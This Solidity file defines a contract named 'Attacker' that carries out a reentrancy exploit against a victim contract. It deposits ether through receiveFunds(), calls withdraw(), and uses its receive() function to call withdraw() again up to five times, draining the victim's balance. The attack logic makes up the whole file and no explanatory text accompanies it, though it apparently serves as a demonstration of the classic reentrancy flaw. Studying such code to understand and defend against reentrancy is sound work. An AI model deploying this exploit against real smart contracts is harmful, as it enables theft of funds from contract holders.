//SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

contract Attacker {
    address v;
    uint public count;
    bool public value;
   
    event LogFallback(uint _count, uint _balance);
    
    constructor(address _victim) payable {
        v = _victim;
    }

    function attackerBalance() public view returns (uint) { 
        return address(this).balance;
    }

    function sendFunds() external {
            (value, ) = v.call{value: 1 ether}(abi.encodeWithSignature("receiveFunds()"));
    }

    function attack() public { 
        (value, ) = v.call(abi.encodeWithSignature("withdraw()"));
    }
    
    fallback() external payable {}

    receive() external payable { 
        emit LogFallback(++count, address(this).balance);
        
        //It avoids to drain all gas and stop the attack.
        if(count < 5) 
            (value, ) = v.call(abi.encodeWithSignature("withdraw()"));
    }
}